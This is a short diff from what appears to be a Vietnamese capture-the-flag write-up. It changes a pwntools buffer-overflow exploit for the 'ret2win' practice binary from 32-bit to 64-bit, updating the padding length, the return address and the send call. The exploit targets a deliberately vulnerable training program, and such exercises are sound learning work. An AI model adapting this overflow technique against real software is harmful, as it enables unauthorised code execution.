@@ -39,11 +39,11 @@ Ta có script như sau:
 ```
 from pwn import *
 
-r = process("./ret2win32")
+r = process("./ret2win")
 
-ret2win = 0x804862c
-payload = b'a'*44 + p32(ret2win)
-r.sendline(payload)
+ret2win = 0x400756
+payload = b'a'*40 + p64(ret2win)
+r.sendafter('> ', payload)
 r.interactive()
 ```
 
